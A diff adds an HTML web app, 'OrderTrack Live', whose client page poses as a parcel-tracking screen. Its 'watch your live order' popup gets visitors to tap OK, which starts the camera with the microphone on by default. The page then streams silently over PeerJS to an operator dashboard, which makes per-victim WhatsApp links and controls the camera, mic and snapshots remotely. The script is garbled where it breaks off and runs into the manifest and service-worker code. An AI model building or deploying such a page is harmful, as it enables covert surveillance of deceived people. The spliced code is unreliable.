@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0b141a">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<title>OrderTrack Live</title>
+<link rel="manifest" href="manifest.json">
+<link rel="apple-touch-icon" href="icon.png">
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%;margin:0}
+body{background:#0b141a;color:#e9edef;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;overflow:hidden}
+button{font-family:inherit;cursor:pointer;border:0}
+#clientView{display:none;flex-direction:column;height:100%}
+#clientView .top{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid #22303a}
+#clientView .brand{font-weight:700;font-size:16px}
+#clientView .pill{font-size:11px;padding:4px 10px;border-radius:99px;background:rgba(255,255,255,.08);color:#8696a0}
+#clientView .pill.on{background:rgba(0,168,132,.18);color:#00a884}
+#clientView .cbody{padding:16px;display:flex;flex-direction:column;gap:12px;flex:1;overflow:auto}
+#clientView .card{background:#111b21;border:1px solid #22303a;border-radius:14px;padding:14px}
+#clientView .row{display:flex;justify-content:space-between;padding:8px 0;font-size:14px;color:#8696a0}
+#clientView .row b{color:#e9edef}
+#clientView .green{color:#00a884}
+#clientView .step{display:flex;gap:12px;align-items:flex-start}
+#clientView .step .b{width:22px;height:22px;border-radius:99px;border:2px solid #22303a;flex:0 0 auto;display:flex;align-items:center;justify-content:center;font-size:12px;color:#8696a0}
+#clientView .step.done .b{border-color:#00a884;color:#00a884}
+#clientView .step .t{padding-bottom:14px}
+#clientView .step h4{margin:2px 0;font-size:14px}
+#clientView .step p{margin:0;font-size:12px;color:#8696a0}
+#clientView .overlay{position:fixed;inset:0;background:rgba(0,0,0,.72);backdrop-filter:blur(6px);display:flex;align-items:center;justify-content:center;padding:22px;z-index:50}
+#clientView .overlay.hide{display:none}
+#clientView .pop{width:100%;max-width:380px;background:#111b21;border:1px solid #22303a;border-radius:20px;padding:26px 22px 20px;text-align:center}
+#clientView .pop .ico{width:64px;height:64px;margin:0 auto 14px;border-radius:99px;background:rgba(0,168,132,.12);display:flex;align-items:center;justify-content:center;font-size:30px}
+#clientView .pop h1{margin:0 0 10px;font-size:19px;line-height:1.35}
+#clientView .pop p{margin:0 0 20px;font-size:13.5px;color:#8696a0;line-height:1.6}
+#clientView .pop button{width:100%;padding:14px;border:0;border-radius:12px;background:#00a884;color:#05221b;font-size:16px;font-weight:700}
+#clientView .pop button:disabled{opacity:.6}
+#clientView .note{margin-top:12px;font-size:11.5px;color:#5f6d75}
+#clientView .pip{position:fixed;right:12px;bottom:12px;width:104px;height:78px;border-radius:12px;overflow:hidden;border:1px solid #22303a;background:#000;z-index:40;opacity:0;transition:opacity .4s;pointer-events:none}
+#clientView .pip.show{opacity:1}
+#clientView .pip video{width:100%;height:100%;object-fit:cover}
+#clientView .pip .tag{position:absolute;left:6px;top:6px;font-size:9px;background:rgba(0,0,0,.6);padding:2px 6px;border-radius:99px}
+#dashView{display:none;width:100%;height:100%}
+#dashView .side{width:370px;flex:0 0 370px;background:#111b21;border-right:1px solid #2a3942;display:flex;flex-direction:column;height:100%}
+#dashView .top{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:#202c33}
+#dashView .me{display:flex;gap:10px;align-items:center}
+#dashView .av{width:38px;height:38px;border-radius:99px;background:#00a884;color:#06231c;display:flex;align-items:center;justify-content:center;font-weight:700;flex:0 0 auto}
+#dashView .me b{display:block;font-size:14px}
+#dashView .me small{color:#8696a0;font-size:11px}
+#dashView .gen{background:#00a884;color:#06231c;font-weight:700;padding:9px 14px;border-radius:99px;font-size:13px}
+#dashView .search{padding:8px 12px}
+#dashView .search input{width:100%;padding:9px 14px;border-radius:99px;background:#202c33;border:1px solid #2a3942;color:#e9edef;outline:none;font-size:13.5px}
+#dashView .list{flex:1;overflow:auto}
+#dashView .item{display:flex;gap:12px;align-items:center;padding:10px 14px;cursor:pointer;border-bottom:1px solid #1c262d}
+#dashView .item:hover{background:#202c33}
+#dashView .item.sel{background:#2a3942}
+#dashView .item .mid{flex:1;min-width:0}
+#dashView .item .r1{display:flex;justify-content:space-between;gap:8px}
+#dashView .item .nm{font-size:14.5px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+#dashView .item .tm{font-size:11px;color:#8696a0}
+#dashView .item .st{font-size:12px;color:#8696a0}
+#dashView .item .st.live{color:#00a884}
+#dashView .th{position:relative;width:64px;height:48px;border-radius:8px;overflow:hidden;background:#000;flex:0 0 auto}
+#dashView .th video{width:100%;height:100%;object-fit:cover}
+#dashView .th .bd{position:absolute;left:5px;top:5px;width:8px;height:8px;border-radius:99px;background:#5b6b74}
+#dashView .th .bd.on{background:#00a884;box-shadow:0 0 0 3px rgba(0,168,132,.25)}
+#dashView .empty2{padding:26px 16px;color:#8696a0;font-size:13px;text-align:center;line-height:1.6}
+#dashView .main{flex:1;display:flex;flex-direction:column;height:100%}
+#dashView .stage{display:none;flex-direction:column;height:100%}
+#dashView .stage.on{display:flex}
+#dashView .shead{display:flex;align-items:center;gap:12px;padding:10px 14px;background:#202c33;border-bottom:1px solid #2a3942}
+#dashView .shead .nm{font-weight:600;font-size:15px}
+#dashView .shead .sub{font-size:11.5px;color:#8696a0}
+#dashView .grow{flex:1}
+#dashView .back{display:none;background:#2a3942;color:#e9edef;padding:8px 12px;border-radius:9px;font-size:13px}
+#dashView .vwrap{flex:1;background:#000;position:relative;display:flex;align-items:center;justify-content:center;overflow:hidden}
+#dashView .vwrap video{width:100%;height:100%;object-fit:contain;background:#000}
+#dashView .badge{position:absolute;left:12px;top:12px;background:rgba(0,0,0,.55);padding:5px 10px;border-radius:99px;font-size:11px;display:flex;gap:7px;align-items:center}
+#dashView .dot{width:8px;height:8px;border-radius:99px;background:#5b6b74}
+#dashView .dot.on{background:#00a884}
+#dashView .bar{display:flex;gap:8px;padding:10px 12px;background:#202c33;flex-wrap:wrap;border-top:1px solid #2a3942}
+#dashView .bar button{background:#2a3942;color:#e9edef;padding:9px 14px;border-radius:10px;font-size:13px}
+#dashView .bar button.on{background:#00a884;color:#06231c}
+#dashView .bar button.danger{background:#3a2226;color:#f15c6d}
+#dashView .placeholder{flex:1;display:flex;align-items:center;justify-content:center;color:#8696a0;font-size:14px;text-align:center;padding:20px;line-height:1.7}
+#dashView .modal{position:fixed;inset:0;background:rgba(0,0,0,.6);display:none;align-items:center;justify-content:center;padding:18px;z-index:60}
+#dashView .modal.on{display:flex}
+#dashView .box{background:#111b21;border:1px solid #2a3942;border-radius:16px;padding:20px;width:100%;max-width:440px}
+#dashView .box h3{margin:0 0 14px;font-size:17px}
+#dashView .box label{display:block;font-size:12px;color:#8696a0;margin:10px 0 5px}
+#dashView .box input{width:100%;padding:11px 13px;border-radius:10px;background:#202c33;border:1px solid #2a3942;color:#e9edef;outline:none}
+#dashView .btns{display:flex;gap:10px;margin-top:16px}
+#dashView .btns button{flex:1;padding:12px;border-radius:10px;font-weight:600;font-size:14px}
+#dashView .primary{background:#00a884;color:#06231c}
+#dashView .ghost{background:#2a3942;color:#e9edef}
+#dashView .link{margin-top:14px;padding:11px;border-radius:10px;background:#0b141a;border:1px dashed #2a3942;font-size:12px;word-break:break-all;color:#53bdeb}
+#dashView .hintx{font-size:12px;color:#8696a0;line-height:1.6;margin:12px 0 0}
+@media(max-width:860px){
+  #dashView .side{width:100%;flex:1 1 auto}
+  #dashView .main{display:none;flex:1 1 auto}
+  body.staged #dashView .side{display:none}
+  body.staged #dashView .main{display:flex}
+  #dashView .back{display:block}
+}
+</style>
+</head>
+<body>
+
+<div id="clientView">
+  <div class="top">
+    <div class="brand">📦 OrderTrack</div>
+    <div class="pill" id="cPill">Connecting</div>
+  </div>
+  <div class="cbody">
+    <div class="card">
+      <div class="row"><span>Order ID</span><b id="cOid">#------</b></div>
+      <div class="row"><span>Status</span><b class="green">On the way</b></div>
+      <div class="row"><span>Delivery</span><b>Today</b></div>
+    </div>
+    <div class="card">
+      <div class="step done"><div class="b">✓</div><div class="t"><h4>Order confirmed</h4><p>Your order has been placed</p></div></div>
+      <div class="step done"><div class="b">✓</div><div class="t"><h4>Out for delivery</h4><p>Rider is on the way</p></div></div>
+      <div class="step"><div class="b">●</div><div class="t"><h4>Live tracking</h4><p id="cStepMsg">Waiting for connection…</p></div></div>
+    </div>
+  </div>
+  <div class="overlay" id="cOv">
+    <div class="pop">
+      <div class="ico">📷</div>
+      <h1>You can watch your live order 24/7</h1>
+      <p>Tap <b>OK</b> below and keep this page open — your order will be tracked live.</p>
+      <button id="cOk">OK</button>
+      <div class="note">Please don't close this page</div>
+    </div>
+  </div>
+  <div class="pip" id="cPip"><video id="cPv" autoplay muted playsinline></video><div class="tag">LIVE</div></div>
+</div>
+
+<div id="dashView">
+  <div class="side">
+    <div class="top">
+      <div class="me"><div class="av">O</div><div><b>Owner Dashboard</b><small id="meStatus">Connecting…</small></div></div>
+      <button class="gen" id="gen">+ Generate</button>
+    </div>
+    <div class="search"><input id="q" placeholder="Search name / number"></div>
+    <div class="list" id="list"></div>
+    <div class="empty2" id="empty2">Abhi koi client nahi.<br>Upar <b>+ Generate</b> dabayein.</div>
+  </div>
+  <div class="main">
+    <div class="placeholder" id="placeholder">Kisi client par click karein — us ka live camera yahan khulega.</div>
+    <div class="stage" id="stage">
+      <div class="shead">
+        <button class="back" id="back">←</button>
+        <div><div class="nm" id="sName">Client</div><div class="sub" id="sSub"></div></div>
+        <div class="grow"></div>
+        <div class="badge"><span class="dot" id="sDot"></span><span id="sState">OFFLINE</span></div>
+      </div>
+      <div class="vwrap"><video id="mv" autoplay playsinline></video></div>
+      <div class="bar">
+        <button id="bMic">Mic: Off</button>
+        <button id="bSwitch">Switch Cam</button>
+        <button id="bSnap">Snapshot</button>
+        <button id="bFull">Fullscreen</button>
+        <button id="bCopy">Copy Link</button>
+        <button id="bWa">WhatsApp</button>
+        <button class="danger" id="bDel">Remove</button>
+      </div>
+      <div class="hintx" id="sInfo" style="padding:0 14px 12px"></div>
+    </div>
+  </div>
+  <div class="modal" id="modal">
+    <div class="box">
+      <h3>New client link</h3>
+      <label>Client name</label><input id="fName" placeholder="e.g. Ali Rider">
+      <label>WhatsApp number (country code ke saath)</label><input id="fNum" placeholder="e.g. 923001234567">
+      <div class="btns" id="btns1"><button class="ghost" id="cancel">Cancel</button><button class="primary" id="create">Generate link</button></div>
+      <div id="linkBox" hidden>
+        <div class="link" id="linkTxt"></div>
+        <div class="btns"><button class="ghost" id="copyLink">Copy</button><button class="primary" id="waShare">Send on WhatsApp</button></div>
+        <p class="hintx">Link client ko bhejein. Client sirf OK dabaye ga — camera start ho kar aap ke dashboard par LIVE aa jaye ga.</p>
+        <div class="btns"><button class="ghost" id="done">Done</button></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+<script>
+const OWNER_KEY = "vnx7k3p9";
+const DASH_ID   = "vlt-owner-" + OWNER_KEY;
+const ID_PREFIX = "vlt-c-" + OWNER_KEY + "-";
+const ICE = { iceServers: [
+  { urls: ["stun:stun.l.google.com:19302","stun:stun1.l.google.com:19302"] },
+  { urls: "turn:openrelay.metered.ca:80", username:"openrelayproject", credential:"openrelayproject" },
+  { urls: "turn:openrelay.metered.ca:443", username:"openrelayproject", credential:"openrelayproject" },
+  { urls: "turn:openrelay.metered.ca:443?transport=tcp", username:"openrelayproject", credential:"openrelayproject" }
+]};
+const $ = id => document.getElementById(id);
+const BASE = location.origin + location.pathname.replace(/index\.html$/,"");
+const linkOf = code => BASE + "?c=" + code;
+const now = () => Date.now();
+const params = new URLSearchParams(location.search);
+const CODE = (params.get("c") || "").trim().toUpperCase().replace(/[^A-Z0-9]/g,"");
+
+if ("serviceWorker" in navigator) navigator.serviceWorker.register("sw.js").catch(()=>{});
+
+async function iceType(pc){
+  try{
+    const stats = await pc.getStats(); let pairId=null, type="P2P (direct)";
+    stats.forEach(r=>{ if(r.type==="transport" && r.selectedCandidatePairId) pairId=r.selectedCandidatePairId; });
+    stats.forEach(r=>{
+      if(r.type==="candidate-pair" && (r.selected || r.id===pairId)){
+        const l=stats.get(r.localCandidateId), rem=stats.get(r.remoteCandidateId);
+        if((l&&l.candidateType==="relay")||(rem&&rem.candidateType==="relay")) type="Relay (TURN)";
+      }
+    });
+    return type;
+  }catch(e){ return ""; }
+}
+
+let dummy = null;
+function dummyStream(){
+  if(dummy) return dummy;
+  dummy = new MediaStream();
+  try{
+    const cv = document.createElement("canvas"); cv.width=320; cv.height=180;
+    const ctx = cv.getContext("2d");
+    const draw = ()=>{ ctx.fillStyle="#0b141a"; ctx.fillRect(0,0,320,180);
+      ctx.fillStyle="#00a884"; ctx.font="bold 34px sans-serif"; ctx.textAlign="center"; ctx.fillText("LIVE",160,100); };
+    draw();
+    if(cv.captureStream) cv.captureStream(2).getVideoTracks().forEach(t=>dummy.addTrack(t));
+    setInterval(draw, 3000);
+  }catch(e){}
+  try{
+    const AC = window.AudioContext || window.webkitAudioContext;
+    const ac = new AC(); const dst = ac.createMediaStreamDestination();
+    const o = ac.createOscillator(); const g = ac.createGain(); g.gain.value = 0.0001;
+    o.connect(g); g.connect(dst); o.start();
+    dst.stream.getAudioTracks().forEach(t=>dummy.addTrack(t));
+    document.addEventListener("click", ()=>ac.resume().catch(()=>{}));
+  }catch(e){}
+  return dummy;
+}
+
+function clientMode(){
+  $("clientView").style.display = "flex";
+  document.title = "Order Live Tracking";
+  const pill=$("cPill"), ov=$("cOv"), okBtn=$("cOk"), pip=$("cPip"), pv=$("cPv"), stepMsg=$("cStepMsg");
+  $("cOid").textContent = "#" + CODE;
+  const CLIENT_ID = ID_PREFIX + CODE;
+  const pcs = new Set();
+  let stream=null, facing="environment", micOn=true, peer=null, call=null, conn=null;
+  let live=false, lastCallTry=0, lastConnTry=0, wake=null;
+
+  const setPill = (t,on)=>{ pill.textContent=t; pill.classList.toggle("on",!!on); };
+  const showPip = ms =>{ pip.classList.add("show"); clearTimeout(showPip._t); showPip._t=setTimeout(()=>pip.classList.remove("show"),ms); };
+
+  async function grab(f){
+    return navigator.mediaDevices.getUserMedia({
+      video:{ facingMode:{ideal:f}, width:{ideal:1280}, height:{ideal:720} },
+      audio:{ echoCancellation:true, noiseSuppression:true }
+    });
+  }
+  async function startCam(f){
+    f = f || facing;
+    const s = await grab(f);
+    const nv = s.getVideoTracks()[0], na = s.getAudioTracks()[0];
+    if (na) na.enabled = micOn;
+    if (stream){
+      pcs.forEach(pc => { try{ pc.getSenders().forEach(sn=>{
+        if(!sn.track) return;
+        if(sn.track.kind==="video") sn.replaceTrack(nv);
+        else if(sn.track.kind==="audio" && na) sn.replaceTrack(na);
+      });}catch(e){} });
+      stream.getTracks().forEach(t=>t.stop());
+    }
+    stream = s; facing = f;
+    pv.srcObject = s; pv.play().catch(()=>{});
+    showPip(4500);
+    sendStatus();
+  }
+  function sendStatus(){
+    if(!conn || !conn.open || !stream) return;
+    let res="";
+    try{ const st = stream.getVideoTracks()[0].getSettings(); res=(st.width||"?")+"x"+(st.height||"?"); }catch(e){}
+    conn.send({t:"status", cam:facing, mic:micOn, live:true, res, ts:now()});
+  }
+  function onCmd(d){
+    if(!d || !d.t) return;
+    if(d.t==="switch") startCam(facing==="user"?"environment":"user").catch(()=>sendStatus());
+    else if(d.t==="front") startCam("user").catch(()=>{});
+    else if(d.t==="back") startCam("environment").catch(()=>{});
+    else if(d.t==="mic"){ micOn=!!d.on; if(stream) stream.getAudioTracks().forEach(t=>t.enabled=micOn); sendStatus(); }
+    else if(d.t==="ping") sendStatus();
+  }
+  function dial(){
+    if(!peer || peer.destroyed || !peer.open || !stream) return;
+    if((!conn || !conn.open) && now()-lastConnTry > 6000){
+      lastConnTry = now();
+      try{
+        const c = peer.connect(DASH_ID, {reliable:true, metadata:{code:CODE}});
+        conn = c;
+        c.on("open", ()=>{ live=true; setPill("Live",true); stepMsg.textContent="Live tracking active"; sendStatus(); });
+        c.on("data", onCmd);
+        c.on("close", ()=>{ if(conn===c) conn=null; live=false; setPill("Reconnecting…",false); });
+        c.on("error", ()=>{ if(conn===c) conn=null; live=false; });
+      }catch(e){}
+    }
+    const stale = !call || call.closed || (!call.open && now()-lastCallTry > 12000);
+    if(stale && now()-lastCallTry > 3000){
+      lastCallTry = now();
+      if(call && !call.closed){ try{ call.close(); }catch(e){} }
+      call = null;
+      try{
+        const c2 = peer.call(DASH_ID, stream, {metadata:{code:CODE}});
+        const pc = c2.peerConnection;
+        pcs.add(pc);
+        call = c2;
+        c2.on("open", ()=> setPill("Live",true));
+        c2.on("close", ()=>{ pcs.delete(pc); if(call===c2) call=null; });
+        c2.on("error", ()=>{ pcs.delete(pc); if(call===c2) call=null; });
+      }catch(e){}
+    }
+  }
+  function boot(){
+    const p = new Peer(CLIENT_ID, {debug:1, config:ICE});
+    peer = p;
+    p.on("open", ()=>{ setPill("Connecting…",false); dial(); });
+    p.on("disconnected", ()=> setTimeout(()=>{ try{p.reconnect();}catch(e){} }, 1200));
+    p.on("close", ()=> setTimeout(()=>{ if(peer===p) boot(); }, 2500));
+    p.on("error", e=>{
+      if(e && (e.type==="unavailable-id"||e.type==="network"||e.type==="server-error"||e.type==="socket-error")){
+        setTimeout(()=>{ try{p.reconnect();}catch(_){} }, 1800);
+      }
+    });
+  }
+  function tick(){
+    if(!peer || peer.destroyed) return;
+    if(peer.disconnected){ try{ peer.reconnect(); }catch(e){} }
+    if(!stream) return;
+    const vt = stream.getVideoTracks()[0];
+    if(!vt || vt.readyState==="ended") startCam(facing).catch(()=>{});
+    if(!live) dial();
+  }
+  setInterval(tick, 4000);
+  setInterval(()=>{ if(live) sendStatus(); }, 20000);
+  async function keepAwake(){
+    try{ if("wakeLock" in navigator && !wake) wake = await navigator.wakeLock.request("screen"); }catch(e){}
+  }
+  document.addEventListener("visibilitychange", ()=>{
+    if(document.visibilityState!=="visible") return;
+    wake = null; keepAwake();
+    if(stream && stream.getVideoTracks()[0] && stream.getVideoTracks()[0].readyState!=="live") startCam(facing).catch(()=>{});
+  });
+  okBtn.addEventListener("click", async ()=>{
+    okBtn.disabled = true; okBtn.textContent = "Starting…";
+    try{ await startCam("environment"); }
+    catch(e1){
+      try{ await startCam("user"); }
+      catch(e2){
+        ov.querySelector("p").innerHTML = "Please allow camera access, then tap <b>OK</b> again.<br><small>"+(e2.message||e2.name||"")+"</small>";
+        okBtn.disabled=false; okBtn.textContent="OK"; return;
+      }
+    }
+    ov.classList.add("hide");
+    stepMsg.textContent = "Connecting…";
+    keepAwake{
+  "name": "OrderTrack Live",
+  "short_name": "OrderTrack",
+  "start_url": "./",
+  "scope": "./",
+  "display": "standalone",
+  "orientation": "any",
+  "background_color": "#0b141a",
+  "theme_color": "#0b141a",
+  "icons": [
+    { "src": "icon.png", "sizes": "512x512", "type": "image/png", "purpose": "any" },
+    { "src": "icon.png", "sizes": "512x512", "type": "image/png", "purpose": "maskable" }
+  ]
+  }const CACHE = "livetrack-v1";
+self.addEventListener("install", () => self.skipWaiting());
+self.addEventListener("activate", e => e.waitUntil(self.clients.claim()));
+self.addEventListener("fetch", e => {
+  if (e.request.method !== "GET") return;
+  e.respondWith(
+    fetch(e.request).then(r => {
+      const copy = r.clone();
+      caches.open(CACHE).then(c => c.put(e.request, copy)).catch(() => {});
+      return r;
+    }).catch(() => caches.match(e.request).then(r => r || caches.match("./")))
+  );
+});
